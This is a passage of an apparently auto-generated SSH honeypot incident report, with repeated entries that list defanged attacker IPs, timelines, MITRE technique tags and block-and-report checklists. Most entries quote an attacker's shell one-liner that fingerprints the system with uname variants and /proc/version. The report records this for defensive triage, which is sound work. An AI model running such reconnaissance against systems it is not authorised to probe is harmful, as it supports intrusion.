| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:33:07` | `cowrie.session.connect` |
| `2026-09-08 05:33:07` | `cowrie.client.version` |
| `2026-09-08 05:33:07` | `cowrie.client.kex` |
| `2026-09-08 05:33:08` | `cowrie.login.success` |
| `2026-09-08 05:33:10` | `cowrie.session.params` |
| `2026-09-08 05:33:10` | `cowrie.command.input` |
| `2026-09-08 05:33:10` | `cowrie.log.closed` |
| `2026-09-08 05:33:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cca913870324

| Field | Detail |
|---|---|
| **Source IP** | `184.105.247[.]195` |
| **First Seen** | 2026-09-08 05:33 |
| **Last Seen** | 2026-09-08 05:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:33:31` | `cowrie.session.connect` |
| `2026-09-08 05:33:31` | `cowrie.login.success` |
| `2026-09-08 05:33:31` | `cowrie.session.params` |
| `2026-09-08 05:33:31` | `cowrie.command.input` |
| `2026-09-08 05:33:31` | `cowrie.command.input` |
| `2026-09-08 05:33:31` | `cowrie.command.failed` |
| `2026-09-08 05:33:31` | `cowrie.command.input` |
| `2026-09-08 05:33:31` | `cowrie.command.failed` |
| `2026-09-08 05:33:31` | `cowrie.command.input` |
| `2026-09-08 05:33:31` | `cowrie.log.closed` |
| `2026-09-08 05:33:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `184.105.247[.]195` to AbuseIPDB if not already reported
- [ ] Block `184.105.247[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b698b89a130

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:35 |
| **Last Seen** | 2026-09-08 05:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:35:04` | `cowrie.session.connect` |
| `2026-09-08 05:35:04` | `cowrie.client.version` |
| `2026-09-08 05:35:05` | `cowrie.client.kex` |
| `2026-09-08 05:35:05` | `cowrie.login.success` |
| `2026-09-08 05:35:06` | `cowrie.session.params` |
| `2026-09-08 05:35:06` | `cowrie.command.input` |
| `2026-09-08 05:35:07` | `cowrie.log.closed` |
| `2026-09-08 05:35:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3eedfc464aa9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:37 |
| **Last Seen** | 2026-09-08 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:37:46` | `cowrie.session.connect` |
| `2026-09-08 05:37:46` | `cowrie.client.version` |
| `2026-09-08 05:37:46` | `cowrie.client.kex` |
| `2026-09-08 05:37:46` | `cowrie.login.success` |
| `2026-09-08 05:37:47` | `cowrie.session.params` |
| `2026-09-08 05:37:47` | `cowrie.command.input` |
| `2026-09-08 05:37:47` | `cowrie.log.closed` |
| `2026-09-08 05:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48bc015def1a

| Field | Detail |
|---|---|
| **Source IP** | `34.62.237[.]3` |
| **First Seen** | 2026-09-08 05:40 |
| **Last Seen** | 2026-09-08 05:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:40:05` | `cowrie.session.connect` |
| `2026-09-08 05:40:05` | `cowrie.login.success` |
| `2026-09-08 05:40:06` | `cowrie.session.params` |
| `2026-09-08 05:40:06` | `cowrie.command.input` |
| `2026-09-08 05:40:06` | `cowrie.command.input` |
| `2026-09-08 05:40:06` | `cowrie.command.failed` |
| `2026-09-08 05:40:06` | `cowrie.command.input` |
| `2026-09-08 05:40:06` | `cowrie.log.closed` |
| `2026-09-08 05:40:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.237[.]3` to AbuseIPDB if not already reported
- [ ] Block `34.62.237[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5494b4d2242

| Field | Detail |
|---|---|
| **Source IP** | `34.62.237[.]3` |
| **First Seen** | 2026-09-08 05:40 |
| **Last Seen** | 2026-09-08 05:40 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:40:19` | `cowrie.session.connect` |
| `2026-09-08 05:40:19` | `cowrie.login.success` |
| `2026-09-08 05:40:19` | `cowrie.session.params` |
| `2026-09-08 05:40:19` | `cowrie.command.input` |
| `2026-09-08 05:40:19` | `cowrie.command.failed` |
| `2026-09-08 05:40:31` | `cowrie.log.closed` |
| `2026-09-08 05:40:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.237[.]3` to AbuseIPDB if not already reported
- [ ] Block `34.62.237[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6f0bfdb79c5

| Field | Detail |
|---|---|
| **Source IP** | `34.62.237[.]3` |
| **First Seen** | 2026-09-08 05:40 |
| **Last Seen** | 2026-09-08 05:40 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:40:20` | `cowrie.session.connect` |
| `2026-09-08 05:40:20` | `cowrie.login.success` |
| `2026-09-08 05:40:21` | `cowrie.session.params` |
| `2026-09-08 05:40:21` | `cowrie.command.input` |
| `2026-09-08 05:40:31` | `cowrie.log.closed` |
| `2026-09-08 05:40:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.237[.]3` to AbuseIPDB if not already reported
- [ ] Block `34.62.237[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2e0a562c207

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:40 |
| **Last Seen** | 2026-09-08 05:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:40:24` | `cowrie.session.connect` |
| `2026-09-08 05:40:24` | `cowrie.client.version` |
| `2026-09-08 05:40:24` | `cowrie.client.kex` |
| `2026-09-08 05:40:26` | `cowrie.login.success` |
| `2026-09-08 05:40:27` | `cowrie.session.params` |
| `2026-09-08 05:40:27` | `cowrie.command.input` |
| `2026-09-08 05:40:28` | `cowrie.log.closed` |
| `2026-09-08 05:40:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6d2bfca991d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:42 |
| **Last Seen** | 2026-09-08 05:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:42:02` | `cowrie.session.connect` |
| `2026-09-08 05:42:02` | `cowrie.client.version` |
| `2026-09-08 05:42:02` | `cowrie.client.kex` |
| `2026-09-08 05:42:04` | `cowrie.login.success` |
| `2026-09-08 05:42:05` | `cowrie.session.params` |
| `2026-09-08 05:42:05` | `cowrie.command.input` |
| `2026-09-08 05:42:05` | `cowrie.log.closed` |
| `2026-09-08 05:42:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2434edcf9255

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:43 |
| **Last Seen** | 2026-09-08 05:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:43:37` | `cowrie.session.connect` |
| `2026-09-08 05:43:37` | `cowrie.client.version` |
| `2026-09-08 05:43:37` | `cowrie.client.kex` |
| `2026-09-08 05:43:39` | `cowrie.login.success` |
| `2026-09-08 05:43:40` | `cowrie.session.params` |
| `2026-09-08 05:43:40` | `cowrie.command.input` |
| `2026-09-08 05:43:40` | `cowrie.log.closed` |
| `2026-09-08 05:43:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80d94628df49

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:45 |
| **Last Seen** | 2026-09-08 05:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:45:19` | `cowrie.session.connect` |
| `2026-09-08 05:45:19` | `cowrie.client.version` |
| `2026-09-08 05:45:19` | `cowrie.client.kex` |
| `2026-09-08 05:45:20` | `cowrie.login.success` |
| `2026-09-08 05:45:21` | `cowrie.session.params` |
| `2026-09-08 05:45:21` | `cowrie.command.input` |
| `2026-09-08 05:45:22` | `cowrie.log.closed` |
| `2026-09-08 05:45:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e740d89a4f9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:46 |
| **Last Seen** | 2026-09-08 05:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:46:55` | `cowrie.session.connect` |
| `2026-09-08 05:46:55` | `cowrie.client.version` |
| `2026-09-08 05:46:55` | `cowrie.client.kex` |
| `2026-09-08 05:46:56` | `cowrie.login.success` |
| `2026-09-08 05:46:57` | `cowrie.session.params` |
| `2026-09-08 05:46:57` | `cowrie.command.input` |
| `2026-09-08 05:46:58` | `cowrie.log.closed` |
| `2026-09-08 05:46:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-569227f752e8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:48 |
| **Last Seen** | 2026-09-08 05:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:48:35` | `cowrie.session.connect` |
| `2026-09-08 05:48:35` | `cowrie.client.version` |
| `2026-09-08 05:48:35` | `cowrie.client.kex` |
| `2026-09-08 05:48:36` | `cowrie.login.success` |
| `2026-09-08 05:48:38` | `cowrie.session.params` |
| `2026-09-08 05:48:38` | `cowrie.command.input` |
| `2026-09-08 05:48:38` | `cowrie.log.closed` |
| `2026-09-08 05:48:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-027ce02dfb9e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:50 |
| **Last Seen** | 2026-09-08 05:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:50:23` | `cowrie.session.connect` |
| `2026-09-08 05:50:23` | `cowrie.client.version` |
| `2026-09-08 05:50:23` | `cowrie.client.kex` |
| `2026-09-08 05:50:24` | `cowrie.login.success` |
| `2026-09-08 05:50:25` | `cowrie.session.params` |
| `2026-09-08 05:50:25` | `cowrie.command.input` |
| `2026-09-08 05:50:26` | `cowrie.log.closed` |
| `2026-09-08 05:50:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da94be4102c4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:52 |
| **Last Seen** | 2026-09-08 05:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:52:25` | `cowrie.session.connect` |
| `2026-09-08 05:52:25` | `cowrie.client.version` |
| `2026-09-08 05:52:25` | `cowrie.client.kex` |
| `2026-09-08 05:52:25` | `cowrie.login.success` |
| `2026-09-08 05:52:26` | `cowrie.session.params` |
| `2026-09-08 05:52:26` | `cowrie.command.input` |
| `2026-09-08 05:52:26` | `cowrie.log.closed` |
| `2026-09-08 05:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c71d3bd4b4ca

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:55 |
| **Last Seen** | 2026-09-08 05:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:55:07` | `cowrie.session.connect` |
| `2026-09-08 05:55:07` | `cowrie.client.version` |
| `2026-09-08 05:55:07` | `cowrie.client.kex` |
| `2026-09-08 05:55:08` | `cowrie.login.success` |
| `2026-09-08 05:55:09` | `cowrie.session.params` |
| `2026-09-08 05:55:09` | `cowrie.command.input` |
| `2026-09-08 05:55:09` | `cowrie.log.closed` |
| `2026-09-08 05:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a30e9f99843

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:57 |
| **Last Seen** | 2026-09-08 05:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:57:19` | `cowrie.session.connect` |
| `2026-09-08 05:57:20` | `cowrie.client.version` |
| `2026-09-08 05:57:20` | `cowrie.client.kex` |
| `2026-09-08 05:57:21` | `cowrie.login.success` |
| `2026-09-08 05:57:23` | `cowrie.session.params` |
| `2026-09-08 05:57:23` | `cowrie.command.input` |
| `2026-09-08 05:57:24` | `cowrie.log.closed` |
| `2026-09-08 05:57:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d74d89a28b7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:58 |
| **Last Seen** | 2026-09-08 05:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:58:57` | `cowrie.session.connect` |
| `2026-09-08 05:58:57` | `cowrie.client.version` |
| `2026-09-08 05:58:57` | `cowrie.client.kex` |
| `2026-09-08 05:58:59` | `cowrie.login.success` |
| `2026-09-08 05:59:00` | `cowrie.session.params` |
| `2026-09-08 05:59:00` | `cowrie.command.input` |
| `2026-09-08 05:59:01` | `cowrie.log.closed` |
| `2026-09-08 05:59:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7e6aed3c497

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 06:00 |
| **Last Seen** | 2026-09-08 06:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
